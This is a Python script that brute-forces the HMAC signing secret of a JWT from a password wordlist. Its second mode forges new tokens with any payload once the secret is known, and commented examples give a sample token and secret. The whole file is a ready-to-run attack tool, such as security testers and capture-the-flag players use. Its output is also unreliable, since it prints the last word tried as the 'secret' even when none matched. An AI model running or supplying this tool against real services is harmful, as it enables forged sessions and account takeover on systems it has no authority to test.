import sys
from jwt import encode, decode
from json import loads, dumps
from base64 import b64encode, b64decode
from tqdm import tqdm

def print_usage():
    print('Usage:')
    print('\tpython3 brute_force_jwt_token.py make - to create a token using a leaked secret')
    print('\tpython3 brute_force_jwt_token.py break - to find the secret used by JWT token')

def make_jwt():
    payload = loads(input('JWT payload: ').strip())
    secret = input('JWT signing secet: ').strip()
    algorithm = input('JWT encoding algorithm: ').strip()

    # EXAMPLE: uncomment the following and comment off the above to see the tool in action
    # payload = loads('{"username": "kmmanoj96", "expires": 9999999999.00}')
    # secret = 'P@55w0rd!'
    # algorithm = 'HS256'

    jwt_token = encode(payload, secret, algorithm=algorithm)
    print(f'JWT Token = {jwt_token}')

def break_jwt():
    jwt_token = input('JWT token: ')
    
    # EXAMPLE: uncomment the following (and comment off the above) to see the tool in action
    # jwt_token = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImttbWFub2o5NiIsImV4cGlyZXMiOjE2MDAwMDAwMDAuMH0.VVtGaTXKXeTuH3LaKPAnOeb0kk625QN-RYzd_ig9rkY'

    algorithm = None
    for i in range(6):
        try:
            jwt_alg_part = jwt_token.split('.')[0]
            algorithm = loads(b64decode(jwt_alg_part + '='*i).decode())['alg']
            break
        except:
            pass
    payload = None
    for i in range(6):
        try:
            jwt_data_part = jwt_token.split('.')[1]
            payload = b64decode(jwt_data_part + '='*i).decode()
            break
        except:
            pass
    
    wordlist = input('Wordlist filepath (default: ./fasttrack.txt):')

    print('Breaking the JWT token:')
    for secret in tqdm(open('./fasttrack.txt' if wordlist == '' else wordlist).read().split('\n')):
        try:
            data = decode(jwt_token, secret, algorithms=algorithm)
            break
        except Exception:
            pass
    print(f'JWT = payload: {payload} algorithm: {algorithm} secret: {secret}')

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print_usage()
        exit(0)
    
    action = sys.argv[1]
    if action == 'make':
        make_jwt()
    elif action == 'break':
        break_jwt()
    else:
        print('Invalid action')
        print_usage()

